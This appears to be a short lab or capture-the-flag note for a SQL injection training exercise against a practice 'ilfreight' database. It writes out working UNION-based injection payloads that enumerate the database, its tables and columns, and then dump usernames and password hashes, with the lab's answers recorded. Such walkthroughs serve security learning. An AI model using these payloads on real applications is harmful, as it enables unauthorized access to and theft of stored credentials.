# [Database Enumeration](Database%20Enumeration.md)
### What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

```sql
-- Current database name  
cn' UNION select 1,database(),2,3-- -  
-- Answer: ilfreight  
  
-- List all tables in a specific database  
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -  
-- Answer: Tables(products,users,ports)  
  
-- List all columns in a specific table  
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -  
-- Answer: Columns(USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password)  
  
-- Dump data from a table in another database  
cn' UNION select 1, username, password, 4 from ilfreight.users-- -
```
![](Screenshot%202026-06-19%20at%2012.19.58.png)